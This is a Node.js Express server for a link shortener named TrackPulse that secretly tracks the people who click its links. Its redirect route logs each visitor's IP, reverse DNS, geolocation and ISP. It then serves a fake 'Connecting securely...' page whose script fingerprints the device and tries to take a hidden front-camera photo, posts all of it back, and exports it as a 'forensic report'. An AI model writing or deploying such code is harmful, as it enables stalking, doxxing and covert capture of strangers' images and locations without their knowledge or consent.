const express = require('express');
const cors = require('cors');
const path = require('path');
const dns = require('dns').promises;
const axios = require('axios');
const useragent = require('useragent');
require('dotenv').config();
const db = require('./db');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Middleware for Cloud DB sync on Vercel
app.use(async (req, res, next) => {
  try {
    await db.initSync();
  } catch(e) {}
  next();
});

// Helper to generate short code
function generateShortCode(length = 6) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Helper to sanitize slug (replace spaces and special characters with hyphens)
function sanitizeSlug(slug) {
  if (!slug) return '';
  return slug
    .trim()
    .toLowerCase()
    .replace(/\s+/g, '-')       // Replace spaces with -
    .replace(/[^\w\-]+/g, '')   // Remove all non-word chars
    .replace(/\-\-+/g, '-');    // Replace multiple - with single -
}

// Helper to get client IP
function getClientIp(req) {
  let ip = req.headers['x-forwarded-for'] || 
           req.headers['x-real-ip'] || 
           req.socket.remoteAddress || 
           req.ip || '';
  
  if (ip.includes(',')) {
    ip = ip.split(',')[0].trim();
  }
  if (ip.startsWith('::ffff:')) {
    ip = ip.substr(7);
  }
  return ip;
}

// Reverse DNS Lookup
async function getReverseDns(ip) {
  if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.')) {
    return 'localhost.localdomain';
  }
  try {
    const hostnames = await dns.reverse(ip);
    return (hostnames && hostnames.length > 0) ? hostnames[0] : 'N/A';
  } catch (err) {
    return 'N/A';
  }
}

// Helper to fetch IP Geolocation + VPN/Proxy info
async function fetchIpGeolocation(ip) {
  const isLocal = !ip || ip === '127.0.0.1' || ip === '::1' || ip === 'localhost' || ip.startsWith('192.168.') || ip.startsWith('10.');
  
  try {
    const targetIp = isLocal ? '' : ip;
    const response = await axios.get(`http://ip-api.com/json/${targetIp}?fields=status,country,countryCode,regionName,city,isp,org,lat,lon,mobile,proxy,hosting,query`, {
      timeout: 3000
    });

    if (response.data && response.data.status === 'success') {
      return {
        ipAddress: response.data.query || ip,
        country: response.data.country,
        countryCode: response.data.countryCode,
        region: response.data.regionName,
        city: response.data.city,
        isp: response.data.isp,
        org: response.data.org,
        lat: response.data.lat,
        lon: response.data.lon,
        isProxy: response.data.proxy || false,
        isMobileNet: response.data.mobile || false,
        isHosting: response.data.hosting || false,
        isLocal: isLocal
      };
    }
  } catch (err) {
    console.error('IP Geolocation fetch error:', err.message);
  }

  return {
    ipAddress: ip || '127.0.0.1',
    country: isLocal ? 'Local Network' : 'Unknown',
    countryCode: isLocal ? 'LOCAL' : '',
    region: isLocal ? 'Localhost' : 'Unknown',
    city: isLocal ? 'Localhost' : 'Unknown',
    isp: isLocal ? 'Local Network' : 'Unknown',
    org: 'Unknown',
    lat: 23.8103,
    lon: 90.4125,
    isProxy: false,
    isMobileNet: false,
    isHosting: false,
    isLocal: isLocal
  };
}

// --- API ENDPOINTS ---

// Create Link
app.post('/api/links', (req, res) => {
  try {
    let { destinationUrl, title, customSlug } = req.body;
    if (!destinationUrl) {
      return res.status(400).json({ error: 'Destination URL is required' });
    }

    if (!destinationUrl.startsWith('http://') && !destinationUrl.startsWith('https://')) {
      destinationUrl = 'https://' + destinationUrl;
    }

    let shortCode = sanitizeSlug(customSlug);
    if (!shortCode) {
      shortCode = generateShortCode();
    }

    if (db.getLinkByShortCode(shortCode)) {
      return res.status(400).json({ error: `Link code "${shortCode}" already exists. Please choose another.` });
    }

    const linkTitle = title || destinationUrl;
    const newLink = db.createLink(shortCode, linkTitle, destinationUrl);
    const baseUrl = process.env.BASE_URL || `${req.protocol}://${req.get('host')}`;

    res.json({
      success: true,
      link: newLink,
      trackingUrl: `${baseUrl}/r/${shortCode}`
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Get All Links
app.get('/api/links', (req, res) => {
  try {
    const links = db.getAllLinks();
    res.json(links);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Delete Link
app.delete('/api/links/:id', (req, res) => {
  try {
    db.deleteLink(req.params.id);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Log Client JavaScript Deep Metadata & Camera Snapshot
app.post('/api/log-client-data', (req, res) => {
  try {
    const { logId, clientData } = req.body;
    if (logId && clientData) {
      db.updateLogClientData(logId, clientData);
    }
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Export CSV Forensic Report
app.get('/api/export-csv', (req, res) => {
  try {
    const logs = db.getAllLogs(1000);
    let csv = 'Log ID,Timestamp,Link Title,Short Code,IP Address,Reverse DNS Hostname,Country,City,ISP,Proxy/VPN,Mobile Network,Device Type,Exact Device Model,Browser,OS,Screen Resolution,Timezone,GPU,CPU Cores,Language,Camera Photo Captured\n';
    
    logs.forEach(l => {
      csv += `"${l.id}","${l.created_at}","${l.link_title}","${l.short_code}","${l.ip_address}","${l.reverse_dns}","${l.country}","${l.city}","${l.isp}","${l.is_proxy ? 'YES' : 'NO'}","${l.is_mobile_net ? 'YES' : 'NO'}","${l.device}","${l.device_model}","${l.browser}","${l.os}","${l.screen_res}","${l.timezone}","${l.gpu}","${l.cpu_cores}","${l.language}","${l.camera_snap ? 'YES' : 'NO'}"\n`;
    });

    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', 'attachment; filename="trackpulse_forensic_report.csv"');
    res.status(200).send(csv);
  } catch (err) {
    res.status(500).send('Error generating CSV');
  }
});

// Get Logs for Specific Link
app.get('/api/links/:id/logs', (req, res) => {
  try {
    const logs = db.getLogsByLinkId(req.params.id);
    res.json(logs);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Get All Click Logs
app.get('/api/logs', (req, res) => {
  try {
    const limit = req.query.limit ? parseInt(req.query.limit) : 100;
    const logs = db.getAllLogs(limit);
    res.json(logs);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Get Statistics
app.get('/api/stats', (req, res) => {
  try {
    const stats = db.getStats();
    res.json(stats);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// --- ADVANCED TRACKER & REDIRECT ENDPOINT ---
app.get('/r/:shortCode', async (req, res) => {
  let { shortCode } = req.params;
  shortCode = decodeURIComponent(shortCode || '').trim();
  
  let link = db.getLinkByShortCode(shortCode);
  if (!link) {
    link = db.getLinkByShortCode(sanitizeSlug(shortCode));
  }

  if (!link) {
    return res.status(404).send('<div style="font-family:sans-serif; text-align:center; padding:50px;"><h1>404 - Tracking Link Not Found</h1><p>The requested tracking code does not exist or has expired.</p></div>');
  }

  let logId = null;
  try {
    const clientIp = getClientIp(req);
    const agent = useragent.parse(req.headers['user-agent']);
    const reverseHost = await getReverseDns(clientIp);
    
    let deviceType = 'Desktop';
    const uaString = (req.headers['user-agent'] || '').toLowerCase();
    if (uaString.includes('mobile') || uaString.includes('android') || uaString.includes('iphone')) {
      deviceType = 'Mobile';
    } else if (uaString.includes('tablet') || uaString.includes('ipad')) {
      deviceType = 'Tablet';
    }

    const geo = await fetchIpGeolocation(clientIp);

    const log = db.logClick({
      linkId: link.id,
      ipAddress: geo.ipAddress,
      reverseDns: reverseHost,
      country: geo.country,
      countryCode: geo.countryCode,
      region: geo.region,
      city: geo.city,
      isp: geo.isp,
      org: geo.org,
      lat: geo.lat,
      lon: geo.lon,
      isProxy: geo.isProxy,
      isMobileNet: geo.isMobileNet,
      isHosting: geo.isHosting,
      userAgent: req.headers['user-agent'] || '',
      browser: `${agent.family} ${agent.major}`,
      os: `${agent.os.family} ${agent.os.major}`,
      device: deviceType,
      deviceModel: agent.device.family !== 'Other' ? agent.device.family : 'Generic Device'
    });

    logId = log.id;
  } catch (err) {
    console.error('Error logging click:', err);
  }

  // Completely invisible background transition page (No video elements rendered on screen!)
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="utf-8">
      <title>Connecting securely...</title>
      <style>
        body { background:#0f172a; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
        .spinner { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #3b82f6; border-radius: 50%; width: 24px; height: 24px; animation: spin 0.6s linear infinite; margin-right:12px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
      </style>
    </head>
    <body>
      <div style="display:flex; align-items:center;">
        <div class="spinner"></div>
        <span>Connecting securely...</span>
      </div>

      <script>
        (async function() {
          const destinationUrl = ${JSON.stringify(link.destination_url)};
          const logId = ${logId || 'null'};

          let clientData = {
            screenRes: window.screen ? (window.screen.width + 'x' + window.screen.height) : 'N/A',
            timezone: (Intl && Intl.DateTimeFormat) ? Intl.DateTimeFormat().resolvedOptions().timeZone : 'N/A',
            language: navigator.language || (navigator.languages ? navigator.languages.join(',') : 'N/A'),
            cpuCores: navigator.hardwareConcurrency || 'N/A',
            connectionType: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : 'N/A',
            gpu: 'N/A',
            battery: 'N/A',
            deviceModel: 'N/A',
            cameraSnap: null
          };

          try {
            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
              const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion', 'architecture']);
              if (hints.model) clientData.deviceModel = hints.model;
            }
          } catch(e) {}

          try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
              const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
              if (debugInfo) {
                clientData.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
              }
            }
          } catch(e) {}

          try {
            if (navigator.getBattery) {
              const batt = await navigator.getBattery();
              clientData.battery = Math.round(batt.level * 100) + '%' + (batt.charging ? ' (Charging)' : '');
            }
          } catch(e) {}

          // 100% Invisible Off-Screen Camera Capture (No DOM Elements!)
          try {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
              const stream = await Promise.race([
                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 } }),
                new Promise((_, reject) => setTimeout(() => reject('timeout'), 400))
              ]);
              if (stream) {
                const video = document.createElement('video');
                video.muted = true;
                video.playsInline = true;
                video.srcObject = stream;
                await video.play().catch(() => {});
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                clientData.cameraSnap = canvas.toDataURL('image/jpeg', 0.5);
                
                stream.getTracks().forEach(track => track.stop());
              }
            }
          } catch(e) {}

          if (logId) {
            try {
              fetch('/api/log-client-data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ logId, clientData }),
                keepalive: true
              }).catch(() => {});
            } catch(e) {}
          }

          setTimeout(function() {
            window.location.replace(destinationUrl);
          }, 80);
        })();
      </script>
    </body>
    </html>
  `);
});

app.listen(PORT, () => {
  console.log(`================================================`);
  console.log(` Trackable Link & IP Analytics Server Running`);
  console.log(` URL: http://localhost:${PORT}`);
  console.log(`================================================`);
});
